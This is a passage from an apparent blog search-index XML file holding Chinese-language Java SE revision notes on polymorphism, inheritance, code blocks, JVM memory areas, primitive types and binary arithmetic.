    <content type="text"><![CDATA[多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi(); 成员变量 编译、运行看左边(父类) 也就是创建对象后，子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)，父类引用对象就优先调用父类（编译运行看左边） 解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是父类那么这个引用指向super区域，否则指向this区域 成员方法 编译看左边(父类)、运行看右边(子类)。动态绑定 ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。 静态成员方法 与成员变量同理，编译、运行看左边(父类)，所以多态中静态方法不存在重写 多态的弊端 父类引用不能使用子类特有的属性和行为，但是能通过1zi b = (zi)a; //强转类型 多态的好处 1、提高了代码的维护性(继承保证) 2、提高了代码的扩展性(由多态保证) 多态的使用 1、开发是很少在创建对象的时候使用多态，而是直接创建子类引用子类对象 2、在需要使用方法使代码简洁时，当做参数使用多态效果最好，因为扩展性强 比如：现有三个类“动物”“狗”“猫”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用方法函数来使代码简洁，在调用这个方法时可以创建好一个 狗 或 猫 的对象然后传给参数，这就需要使用到多态了，如果不使多态那么就需要给狗和猫分别创建一个函数。 不过在方法中使用多态还有一个问题：狗 和 猫 都有各自特有的功能与属性，如果调用猫的功能，但是传入的对象是狗，那么就出错了。 解决方法：关键字 instanceof ps：了解一下，开发中用到的不多，一般都用到方法重写 代码实例：12对象变量A instanceof 对象变量B//如果是相同的类返回true 多态中的代码分析123456789101112131415161718192021222324252627282930class A &#123; public void show() &#123; show2(); //这里调用的是子类中的show方法 &#125; public void show2() &#123; System.out.println("我"); &#125;&#125;class B extends A &#123; public void show2() &#123; System.out.println("爱"); &#125;&#125;class C extends B &#123; public void show() &#123; super.show(); &#125; public void show2() &#123; System.out.println("你"); &#125;&#125;public class Test2DuoTai &#123; public static void main(String[] args) &#123; A a = new B(); a.show();//返回一个爱 B b = new C(); b.show(); &#125;&#125; 得出结果： 在多态中，父类中的方法调用另一个方法，且被调用的方法都存在于子类与父类中的情况下，优先调用子类的方法，也就是父类方法成为了一个跳板，跳转到了子类的方法中 还是那句话： 成员方法编译看左边(父类)、运行看右边(子类) 成员变量编译看左边(父类)、运行看左边(父类)]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>多态</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_代码块与继承]]></title>
    <url>%2F2019%2F04%2F06%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8E%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{} 如何创建一个静态方法？ 在方法中加static修饰，那么这个方法是静态方法（函数） 在载入类的时候就这个方法就已经在类的静态区创建，不需要创建对象即可调用 静态变量 在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。 比如 第一条命令给这个变量赋值“张三” 第二条命令又给这个变量赋值“李四” 那么之后调用这个变量时，这个变量返回“李四” 二、构造方法 与 代码块构造方法 构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果 系统会自动创建空参构造，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出 代码块局部代码块 它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率 构造代码块 (初始化块) 构造代码块可以在一个类中执行，执行完就弹栈， 例： 1class Deom&#123; &#123;这就是构造代码块&#125; &#125; ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行 构造代码块可以把一些初始化的代码放在其中，每次调用构造都执行，并且在构造方法之前执行 ps：实际上构造方法开发中用到的不多，但是面试可能会问 构造代码块可以做的功能： 我们可以做诸如统计创建对象的次数等功能。 静态代码块 例： 1static &#123;&#125; 作用： 用于给类进行初始化，在加载的时候就执行，并且只执行一次。 一般用于加载驱动，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。 比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。 注意事项： 1、静态代码块不能访问普通变量 2、静态代码块在 类 中，优先于主方法（面试题） 3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块 类的继承 ps：继承与升级一般都用作系统升级 父类 &gt; 子类 继承的定义 class 子类(当前类) extends 父类(继承的类) ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法 继承的好处： 1、可以提升代码的复用性，不需要打太多重复的代码 2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错 3、是多态的前提 继承的弊端： 1、耦合性非常强，父类有的一些属性可能是子类不需要的 开发原则： 高内聚、低耦合 耦合：类与类的关系 内聚：自己完成某件事的能力 在java中继承的特点： 1、Java只支持单继承不支持多继承（一个孩子只能有一个爹） 2、可以多层继承（继承体系），也就是可以继承爷爷 3、想看这个体系所有功能就看最底层类，也就是儿子类 4、想看这个体系共性功能就要看顶层类，也就是爷爷类 注意事项 1、子类只能继承父类所有非私有的成员（方法和变量） 2、子类不能继承父类的构造方法，因为构造方法必须和类名一样，而继承是不一样的，但可以通过super关键字去访问父类的构造方法 3、不要为了部分功能而去继承，因为继承体现的是一种关系，就算有相同属性也不一定继承。 比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。 4、子父类如果出现相同变量那么会采取就近原则，但是在真正的项目开发中不会出现这种情况，因为没有意义 5、子类无论如何都会访问父类中的构造方法 6、在全是静态方法的类中，构造方法必须私有化，这样防止别人创建这个类的对象 this和super this： 代表当前对象的引用，如果继承了父类，那么也可以引用父类 super： 代表对父类的引用 一些使用实例： this.成员变量名 调用本类成员变量，也可以调用父类的，但是采用就近原则 super.成员变量名 调用父类的成员变量 ps：成员变量名可以是方法名 调用父类中的构造方法: 1super(...); 调用本类中的构造方法: 1this(...); ps：一个方法里只能调用其中的一个 注意事项 类中的构造方法系统都自带super()；但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以super（参数1，参数2....）；也可以用this调用本类的有参构造，进而间接调用父类有参构造 构造方法的调用都是从上到下，即从父类调用到子类，可以理解为一个队列 继承中的面试 1、假设有 子类方法、子类、父类 且其中都有一个num的变量，那么：num用方法中的变量，this.num调用本类中的变量，super.num调用父类中的变量 2、在继承中不要忘记了每个构造方法都会有一个super（）；访问父类 3、override 重写：子类中出现了和父类中方法声明一模一样的方法。与返回值类型有关,返回值类型是一致的 4、overload 重载：本类中出现的方法名一样，参数列表不同的方法。与返回值类型无关。 继承中的成员方法关系 、子、父类有相同方法并且返回值类型也一样，那么会调用子类的方法，也叫方法重写 final概述 它可以用来修饰 类与变量 修饰之后表示它是“最终的”不能被继续操作了 final修饰特点 修饰类，类不能被继承 修饰变量：变量就变成了常量，只能被赋值一次，通常与public static配套使用 修饰方法：方法不能被重写，表示最终方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>代码块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——java的五大内存区域]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94java%E7%9A%84%E4%BA%94%E5%A4%A7%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆 Java程序运行过程 1、加载字节码文件到方法区（.class文件） 2、程序代码依次进栈（jvm执行main方法） 堆（heap）： 最大的一块内存，存放对象实例的地方 1、Java堆是垃圾收集器管理的主要区域，也称GC堆。 2、Java堆物理上可不连续，逻辑上连续。 3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常 虚拟机栈（stack）： java方法执行时的内存模型 栈帧 1、每个方法都会在虚拟机栈中创建一个对应的栈帧，用于存储局部变量表，操作数栈，动态链接，方法出口等信息。 2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈入栈到出栈。 局部变量表 1、存放编译期可知在方法中各种基本数据类型和对象的引用，基本数据类型直接存值, 引用数据类型存地址。 #本地方法栈： 本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务 本地方法 关键字 native ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。 有的虚拟机将本地方法栈和虚拟机栈合在一起，如HotSpot。 方法区： 存已经被虚拟机加载的类信息（Class对象）、常量、静态变量、即时编译器JIT编译过后的代码数据。 jdk 1.7、1.8 对方法区做出了修改，1.8 取消了方法区。 1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap 2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。 3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。 运行时常量池 1、在方法区，用来存放编译期生成的各种符号引用和字面量 2、编译期将各种符号引用和字面量放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时复制到局部变量表中。1.7开始字符串常量池被移入堆中。 符号引用： String ss = “asdsfg” ss这个符号就是符号引用。解析阶段解析为直接引用 字面量： 值本身 如 asdfg 常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。 寄存器（程序计数器）： 占用较小的一块内存空间，当执行Java方法时记录正在执行的虚拟机字节码指令地址，如果执行Native方法则计时器值为空。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>javaSE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——数据类型]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D 整数型（整数常亮默认为int类型） byte：占一个字节 -128 ~ 127 short：占两个字节 -2^15 ~ 2^15-1 int：占四个字节 -2^31 ~ 2^31-1 long：占八个字节 -2^63 ~ 2^63-1 浮点型（小数型，默认小数是double类型） float：占四个字节 -2^128 ~ 2^128 绝对保证精度6位，但有7位有效数字 double：占八个字节 -2^1024 ~ 2^1024 绝对保证精度15位，但有16位有效数字 字符型 char：占两个字节 0 ~ 65535 布尔型（判断） boolean：理论八分之一字节，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小 ps：float由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>数据类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——进制编码]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0 java中的数据表示法 在java中数据前面加 0x表示16进制 0b表示二进制 0表示8进制 进制转换 任何进制转10进制都是 每一位 第某位的数据 乘 被转换的进制数 的 第某位索引次幂 相加 例子八转10：10120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80 10进制转任何进制都是 除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上 2、8互转与2、16互转方法： 2转8 = 3位一组转8 8转2 = 每一位转2 2转16 = 4位一组转16 16转2 = 每一位转2 二进制快速转换10进制方法： 二进制：1 1 1 1 1 1 1 1 十进制：128 64 32 16 8 4 2 1 二进制表示法: 符号位0为正，1为负 计算机二进制运算原理 计算机二进制运算都是用补码 例子： +7 的原码是 0 0000111 ps：正数的、原码、反码、补码都一样 -7 的原码为 1 0000111 反码为 1 1111000 （符号位不变） 补码为 1 1111001（在反码的基础上加1）]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>进制编码</tag>
      </tags>
  </entry>
</search>
